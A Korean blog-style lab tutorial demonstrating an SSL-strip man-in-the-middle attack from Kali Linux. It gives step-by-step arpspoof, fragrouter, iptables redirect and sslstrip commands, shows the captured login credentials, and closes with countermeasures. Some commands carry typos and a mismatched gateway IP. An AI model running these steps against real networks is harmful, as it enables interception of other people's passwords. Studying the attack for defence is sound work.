# SSL Strip MITM Attack [Sniffing]



7 / 6 , 2018 Jinyan 김상민



SSL 통신을 MITM(Man in the middle)공격을 이용하여 Sniffing 하는 방식의 해킹기법을 이야기 하고자 합니다.

 

먼저 SSL 에 대한 설명을 하자면,  통신구간에서 중요정보가 노출되는 것을 막기 위한 '암호화'(SSL) 계층입니다. 예를들어 구글에서 로그인 할때 'http'에서 'https'로 바꿔주면서 개인정보가 암호화되어 전송하게 만듭니다.

  

SSL Sniffing 원리는 공격자가 사용자와 웹서버 중간에 개입하여 HTTPS URL을 HTTP로 변조하여 사용자는 HTTP를 사용하여 암호화 되지 않은 평문을 공격자에게 전송하게 되고 공격자는 평문을 암호화하여 웹서버에 전송하게 함으로써 공격자는 암호화되지 않은 정보를 얻을 수 있게 됩니다.



그럼 시나리오와 공격재현을 짜고 'KaliLiunx' 를 사용하여 실습을 보여주도록 하겠습니다.



#### 공격 시나리오

1. 같은 게이트워이 상태에서 사용자가 구글 홈페이지에 접근 시 HTTP로 유도하고, 사용자는 로그인을 시도합니다.
2. 로그인 시 SSL 통신을 위해 서버는 HTTPS로 유도합니다.
3. 공격자는 서버로 부터 받은 URL을 HTTP로 변조하여 사용자에게 전달합니다.
4. 사용자는 HTTP를 통해 로그인하게 되며, 공격자는 사용자 정보를 Sniffing 할 수 있게됩니다.

게이트워에 - 192.168.65.2

[공격자 - KaliLiunx / IP - eht0 192.168.65.134 ]

[사용자 - Windows7 / IP - 192.168.65.130 ]



#### KaliLiunx 2018.2 [공격자]

> - 게이트웨이 통신 MITM(중간자공격)을 위해 ARP Spoofing을 설정합니다.

```
~# aprspoof -i eht0 -t 192.168.65.130 192.168.62.2
```

arpspoof -i [interface] -t [공격대상 ip], [기본게이트웨이 ip]



> - 희생자 PC의 인터넷 연결을 위해 IP포워딩

```
~# fragrouter -B1
```

B1 : 일반 IP포워딩 [base-1]



> - 공격자는 80포트로 들어오는 패킷을 다른 포트로 대체합니다.

```
~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to ports 10000
```

주 목적지 포트 80번을 sslstrip가 리스닝하고 있는 10000번 포트로 Redirect

t : 테이블명 / A : 정책추가 / p : 프로토콜 / j : 타겟에 대한 규칙 지정



> - SSLStrip를 실행합니다. 

```
~# sslstrip -l 10000
```

sslstrip 실행하고 설정한 10000번 포트를 리스닝

l : port, 지정한포트 / a : 서버와 SSL/HTTP 트래픽을 주고 받음 / w : 저장할 파일명



> - 사용자가 로그인 하였을 때 로그를 열람합니다.

```
cat sslstrip.log
```



<img src="https://user-images.githubusercontent.com/37801676/42416971-c283dfc4-82b7-11e8-83e8-cf96eb973f20.PNG">

이런 식으로 쉽게 개인정보를 쉽게 얻을 수 있다. 



#### Windows 7.x [사용자]



> - 사용자는 구글 사이트에 접속합니다.

<img src="https://user-images.githubusercontent.com/37801676/42416967-b2a5bff0-82b7-11e8-9c44-9b90f2897538.PNG">

- 상단 바에 http로 접속된 것을 확인할 수 있습니다.



> - 사용자는 로그인 창으로 접속합니다.

<img src="https://user-images.githubusercontent.com/37801676/42416969-bea29db4-82b7-11e8-9705-1b46cc171976.PNG">

- 로그인 창에서도 역시 http프로토콜을 사용하는 것을 확인할 수 있습니다.



####  대응방안



> - 사용자
>
> 1. 중요정보를 전송하는 페이지 ex) login 페이지가 https:// 로 시작하는지 체크해야 합니다.
> 2. 신뢰할 수 없는 WI-FI 사용을 지양해야 합니다.
> 3. 신뢰할 수 없는 WI-FI를 사용중이라면 ARP Mac-address 를 스태틱 걸어 줍니다.



> - WI-FI 관리자
>
> 1. WPA2 이상의 쉽게 유추할 수 없는 패스워드를 사용해야합니다.
> 2. 공개 목적이 아니라면, IP/MAC  인증 등의 추가 인증을 넣어야합니다.



> - 웹 서비스 제공자
>
> 1. SSL을 통해 정보를 보호하는 구간에서 HTTP 사용을 방지하고 HTTPS를 강제 사용하도록 해야 합니다.
> 2. 서버 및 네트워크의 트래픽이 비교적 적은 서비스는 가능하다면 웹 사이트 전체에 SSL을 적용하여 HTTPS가 HTTP로 변경될 수 없도록 해야 합니다.

